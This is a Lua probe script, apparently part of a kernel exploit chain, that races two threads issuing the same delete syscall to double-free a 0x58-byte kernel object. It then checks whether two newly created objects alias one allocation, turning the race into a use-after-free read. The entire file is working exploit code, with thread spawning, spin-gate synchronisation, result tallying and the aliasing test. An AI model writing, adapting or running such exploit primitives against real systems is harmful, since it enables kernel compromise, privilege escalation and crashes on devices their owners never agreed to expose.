-- CRASH_CLASS: RISKY
-- PROBE 499a: do two objects created after the double delete alias one allocation?
-- The overlapping deletes both reach the free on the same 0x58 byte object, so the
-- allocator's free list should hold that address twice. The next two creates each
-- allocate one such object. If they get the same address, deleting the first frees
-- the object the second still references, and polling the survivor reads freed memory.
-- The same two-object sequence is run before the race as a control.
print("=== PROBE 499a: alias check after the double delete ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function addrnum(v)
    if type(v) == "table" then
        local h, l = v.h, v.l
        if type(h) == "number" and type(l) == "number" then return h * 4294967296 + l end
        if v.tonumber then local n = v:tonumber(); if type(n) == "number" then return n end end
        error("cannot convert address value")
    end
    return to_num(v)
end
local data, out = memory.alloc(0x2000), memory.alloc(0x100)
local one, st = memory.alloc(8), memory.alloc(0x40)
local sc669, sc664, sc662 = make_syscall(669), make_syscall(664), make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local function create()
  for off = 0, 0xFF, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  if not ok or id <= 0 then return nil end
  pcall(function() memory.write_dword(one, id) end)
  return id
end
local function poll(id)
  pcall(function() memory.write_dword(one, id) end)
  pcall(function() return sc664(uint64(one), uint64(1), uint64(st)) end)
  return to_num(memory.read_dword(st))
end
local function del(id)
  pcall(function() memory.write_dword(one, id) end)
  pcall(function() return sc662(uint64(one), uint64(1), uint64(st)) end)
  return to_num(memory.read_dword(st))
end
-- control: two plain objects, delete one, poll the other
local c1, c2 = create(), create()
print(string.format("control a=%x poll %x, b=%x poll %x", c1 or 0, poll(c1), c2 or 0, poll(c2)))
print(string.format("control delete a=%x, poll b=%x, delete b=%x", del(c1), poll(c2), del(c2)))
-- race
local N, PASSES = 64, 2
local ids, res1, res2 = memory.alloc(N * 4), memory.alloc(PASSES * N * 4), memory.alloc(PASSES * N * 4)
local gate = memory.alloc(0x100)
local made = 0
for i = 0, N - 1 do
  local id = create()
  if id then
    pcall(function() memory.write_dword(ids + i * 4, id) end)
    pcall(function() return sc664(uint64(ids + i * 4), uint64(1), uint64(st)) end)
    made = made + 1
  end
end
print(string.format("race set: %d objects", made))
if made < 2 then return end
for off = 0, PASSES * N * 4 - 1, 4 do
  pcall(function() memory.write_dword(res1 + off, 0x77777777) end)
  pcall(function() memory.write_dword(res2 + off, 0x77777777) end)
end
for off = 0, 0xFF, 4 do pcall(function() memory.write_dword(gate + off, 0) end) end
local body = "local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end\n" ..
  "local d = mk(662)\n" ..
  "while memory.read_dword(GATE) == 0 do end\n" ..
  "memory.write_dword(GATE + 4, 1)\n" ..
  "for p = 0, PASSES - 1 do pcall(function() d(IDS, N, RES2 + p * N * 4) end) end\n" ..
  "memory.write_dword(GATE + 8, 1)\n"
for pat, val in pairs({ ["GATE"] = gate, ["IDS"] = ids, ["RES2"] = res2 }) do
  body = body:gsub(pat, tostring(addrnum(val)))
end
body = body:gsub("PASSES", tostring(PASSES)):gsub("N", tostring(N))
local ok, thr = pcall(run_lua_code_in_new_thread, body, { async = true })
if not ok or type(thr) ~= "table" then print("spawn failed"); return end
local spins = 0
while to_num(memory.read_dword(gate + 4)) == 0 and spins < 4000000 do spins = spins + 1 end
pcall(function() memory.write_dword(gate, 1) end)
for p = 0, PASSES - 1 do
  pcall(function() return sc662(uint64(ids), uint64(N), uint64(res1 + p * N * 4)) end)
end
local jspins = 0
while to_num(memory.read_dword(gate + 8)) == 0 and jspins < 4000000 do jspins = jspins + 1 end
pcall(function() return thr:join() end)
local doubles = 0
for i = 0, N - 1 do
  local c = 0
  for p = 0, PASSES - 1 do
    if to_num(memory.read_dword(res1 + (p * N + i) * 4)) == 0 then c = c + 1 end
    if to_num(memory.read_dword(res2 + (p * N + i) * 4)) == 0 then c = c + 1 end
  end
  if c > 1 then doubles = doubles + 1 end
end
print(string.format("race: ids-with-two=%d", doubles))
-- the aliasing test
local a, b = create(), create()
print(string.format("test a=%x poll %x, b=%x poll %x", a or 0, poll(a), b or 0, poll(b)))
local d1 = del(a)
local pb = poll(b)
local d2 = del(b)
print(string.format("test delete a=%x, poll b=%x, delete b=%x", d1, pb, d2))
print("=== PROBE 499a COMPLETE ===")
